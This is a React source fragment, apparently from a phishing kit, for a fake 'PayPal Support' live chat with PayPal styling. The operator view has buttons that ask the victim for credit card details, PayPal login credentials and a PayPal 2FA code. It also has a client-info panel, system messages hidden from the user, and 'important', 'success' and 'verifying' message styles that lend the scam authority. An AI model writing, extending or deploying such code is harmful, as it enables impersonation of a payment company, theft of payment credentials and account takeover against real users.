                            <span className="w-2 h-2 bg-green-500 rounded-full mr-2"></span>
                            Live
                        </p>
                    </div>
                </div>
                
                <div className="flex items-center gap-4">
                    <div className="text-xs text-gray-500 font-mono">
                        #H25lnFfA3mNbU4nF5WDZ
                    </div>
                    
                    {userType === 'Support' && (
                        <div className="flex items-center gap-2">
                            <button onClick={handleRequestPopup} title="Request Action from User" className="flex items-center gap-1 bg-blue-100 text-blue-800 text-xs font-bold py-2 px-2 rounded-lg hover:bg-blue-200 transition duration-300">
                               <PopupIcon />
                               POP-UP
                            </button>
                            <button onClick={handleRequestCreditCard} title="Request Credit Card Information" className="flex items-center gap-1 bg-green-100 text-green-800 text-xs font-bold py-2 px-2 rounded-lg hover:bg-green-200 transition duration-300">
                               <CreditCardIcon />
                               CB
                            </button>
                            <button onClick={handleRequestPayPalLogin1} title="Request PayPal Login (Step 1)" className="flex items-center gap-1 bg-orange-100 text-orange-800 text-xs font-bold py-2 px-2 rounded-lg hover:bg-orange-200 transition duration-300">
                               <PayPalIcon />
                               PAYPAL 1
                            </button>
                            <button onClick={handleRequestPayPalLogin2} title="Request PayPal 2FA Code (Step 2)" className="flex items-center gap-1 bg-purple-100 text-purple-800 text-xs font-bold py-2 px-2 rounded-lg hover:bg-purple-200 transition duration-300">
                               <PayPalIcon />
                               PAYPAL 2
                            </button>
                            <button onClick={handleClearChat} className="flex items-center gap-1 bg-red-500 text-white text-xs font-bold py-2 px-2 rounded-lg hover:bg-red-600 transition duration-300">
                                <TrashIcon />
                                Clear Chat
                            </button>
                        </div>
                    )}
                </div>
            </header>
            
            {userType === 'Support' && <ClientInfoPanel info={clientInfo} />}

            <main className="flex-1 p-6 overflow-y-auto space-y-6">
                {messages.map((msg, index) => {
                    if (msg.user === 'System' && userType === 'User') {
                        return null;
                    }
                    
                    if (msg.user === 'System') {
                         return (
                            <div key={index} className="text-center my-2">
                                <p className="text-xs text-gray-500 italic bg-gray-200 px-3 py-1 rounded-full inline-block">{msg.text}</p>
                            </div>
                        );
                    }
                    const isCurrentUser = msg.user === userType;
                    if (msg.type === 'file') {
                        return (
                            <div key={index} className={`flex items-start gap-3 ${isCurrentUser ? 'flex-row-reverse' : ''}`}>
                                <div className={`w-10 h-10 rounded-full text-white flex items-center justify-center font-bold flex-shrink-0 ${isCurrentUser ? 'bg-[#009cde]' : 'bg-[#003087]'}`}>
                                    {isCurrentUser ? 'Me' : 'PP'}
                                </div>
                                <div className={`flex flex-col ${isCurrentUser ? 'items-end' : 'items-start'}`}>
                                    <span className="text-sm font-semibold text-[#4a4a4a] mb-1">{isCurrentUser ? 'Me' : 'PayPal Support'}</span>
                                    <div className={`p-3 rounded-lg max-w-md ${isCurrentUser ? 'bg-[#0070ba] rounded-tr-none' : 'bg-[#e1e7eb] rounded-tl-none'}`}>
                                        <a href={msg.content} download={msg.fileName} className={`flex items-center gap-3 no-underline ${isCurrentUser ? 'text-white' : 'text-black'}`}>
                                            <FileIcon />
                                            <div className="flex flex-col">
                                                <span className="font-bold">{msg.fileName}</span>
                                                <span className="text-xs opacity-80">Click to download</span>
                                            </div>
                                        </a>
                                    </div>
                                </div>
                            </div>
                        )
                    }
                     return (
                        <div key={index} className={`flex items-start gap-3 ${isCurrentUser ? 'flex-row-reverse' : ''}`}>
                             <div className={`w-10 h-10 rounded-full text-white flex items-center justify-center font-bold flex-shrink-0 ${isCurrentUser ? 'bg-[#009cde]' : 'bg-[#003087]'}`}>
                                {isCurrentUser ? 'Me' : 'PP'}
                            </div>
                            <div className={`flex flex-col ${isCurrentUser ? 'items-end' : 'items-start'}`}>
                                <span className="text-sm font-semibold text-[#4a4a4a] mb-1">{isCurrentUser ? 'Me' : 'PayPal Support'}</span>
                                <div className={`p-3 rounded-lg max-w-md ${
                                    isCurrentUser
                                    ? 'bg-[#0070ba] text-white rounded-tr-none'
                                    : msg.isImportant
                                        ? 'bg-red-100 text-red-900 border border-red-200 rounded-tl-none'
                                        : msg.isSuccess
                                            ? 'bg-green-100 text-green-900 border border-green-200 rounded-tl-none'
                                            : msg.isVerifying
                                                ? 'bg-blue-100 text-blue-900 border border-blue-200 rounded-tl-none'
                                                : 'bg-[#e1e7eb] text-black rounded-tl-none'
                                }`}>
                                    <p>{msg.text}</p>
                                </div>
                            </div>
                        </div>
                    );
                })}
                {uploading && <div className="text-center text-sm text-gray-500 italic">Uploading files...</div>}
                <div ref={messagesEndRef} />
            </main>

            <footer className="p-4 bg-white border-t border-[#e1e7eb]">
                <form onSubmit={sendMessage} className="flex items-center space-x-2 sm:space-x-4">
                    <input ref={fileInputRef} type="file" onChange={handleFileChange} className="hidden" multiple />
                    <button type="button" onClick={handleAttachmentClick} disabled={uploading} className="text-gray-500 p-2 rounded-full hover:bg-gray-100 transition disabled:opacity-50">
                        <AttachmentIcon />
                    </button>
                    <input type="text" value={message} onChange={(e) => setMessage(e.target.value)} placeholder="Write your message..." className="flex-1 p-3 border border-[#e1e7eb] rounded-full focus:outline-none focus:ring-2 focus:ring-[#009cde] transition" />
                    {userType === 'Support' && (
                        <div className="flex items-center gap-4">
                            <div className="flex items-center" title="Send as important message">
                                <input
                                    type="checkbox"
                                    id="important-checkbox"
                                    checked={isImportant}
                                    onChange={() => handleCheckboxChange('important')}
                                    className="w-4 h-4 text-red-600 bg-gray-100 border-gray-300 rounded focus:ring-red-500 cursor-pointer"
                                />
                                <label htmlFor="important-checkbox" className="ml-2 text-sm font-medium text-red-600 cursor-pointer flex items-center">
                                    <ExclamationIcon />
                                </label>
                            </div>
                            <div className="flex items-center" title="Send as success message">
                                <input
                                    type="checkbox"
                                    id="success-checkbox"
                                    checked={isSuccess}
                                    onChange={() => handleCheckboxChange('success')}
                                    className="w-4 h-4 text-green-600 bg-gray-100 border-gray-300 rounded focus:ring-green-500 cursor-pointer"
                                />
                                <label htmlFor="success-checkbox" className="ml-2 text-sm font-medium text-green-600 cursor-pointer flex items-center">
                                    <CheckIcon />
                                </label>
                            </div>
                            <div className="flex items-center" title="Show verification popup">
                                <input
                                    type="checkbox"
                                    id="verifying-checkbox"
                                    checked={isVerifying}
                                    onChange={() => handleCheckboxChange('verifying')}
                                    className="w-4 h-4 text-blue-600 bg-gray-100 border-gray-300 rounded focus:ring-blue-500 cursor-pointer"
                                />
                                <label htmlFor="verifying-checkbox" className="ml-2 text-sm font-medium text-blue-600 cursor-pointer flex items-center">
                                    <ClockIcon />
                                </label>
                            </div>
                        </div>
                    )}
                    <button type="submit" className="bg-[#0070ba] text-white p-3 rounded-full w-12 h-12 flex items-center justify-center flex-shrink-0 hover:bg-[#003087] transition">
                        <SendIcon />
                    </button>
                </form>
            </footer>
        </div>
    );
}

export default App;
